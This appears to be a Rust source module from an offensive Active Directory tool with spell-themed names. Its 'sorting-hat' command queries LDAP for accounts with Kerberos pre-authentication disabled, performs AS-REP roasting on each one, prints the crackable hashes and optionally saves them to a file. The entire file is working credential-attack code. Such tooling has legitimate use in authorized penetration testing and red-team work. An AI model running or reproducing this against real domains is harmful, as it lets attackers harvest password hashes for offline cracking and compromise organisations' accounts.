use anyhow::Result;
use std::collections::HashMap;
use crate::dungeon::display_charm::*;
use crate::dungeon::ldap_search;
use crate::dungeon::cauldron;
use crate::dungeon::wand_utils;

pub struct SortingHat;

impl super::Spell for SortingHat {
    fn incantation(&self) -> &'static str { "sorting-hat" }
    fn grimoire(&self) -> &'static str {
        "Scan for AS-REP roastable accounts (no pre-auth). \
        /domain: [/ldap:] [/dc:] [/username: /password:] [/roast] [/outfile:]"
    }
    fn cast(&self, args: &HashMap<String, String>) -> Result<()> {
        let domain   = args.get("domain").ok_or_else(|| anyhow::anyhow!("/domain: required"))?;
        let ldap_url = args.get("ldap").map(String::as_str);
        let dc       = args.get("dc").map(String::as_str);
        let ldap_user = args.get("username").map(String::as_str);
        let ldap_pass = args.get("password").map(String::as_str);
        let do_roast = args.contains_key("roast");
        let outfile  = args.get("outfile").map(String::as_str);

        print_banner(&format!("Scanning for AS-REP roastable accounts in {}", domain));

        let accounts = ldap_search::find_no_preauth_accounts(
            domain, ldap_url, dc, ldap_user, ldap_pass,
        )?;

        print_success(&format!("Found {} account(s) with pre-auth disabled:", accounts.len()));
        for a in &accounts {
            println!("  {}", a);
        }

        if do_roast && !accounts.is_empty() {
            println!();
            print_banner("Running AS-REP roast on found accounts...");
            let mut hashes = Vec::new();
            for username in &accounts {
                match cauldron::asrep_roast_single(username, domain, dc) {
                    Ok(hash) => {
                        println!("{}", hash);
                        hashes.push(hash);
                    }
                    Err(e) => print_warning(&format!("{}: {}", username, e)),
                }
            }
            if let Some(path) = outfile {
                let content = hashes.join("\n");
                std::fs::write(path, &content)?;
                print_success(&format!("Hashes written to {}", path));
            }
        }

        Ok(())
    }
}
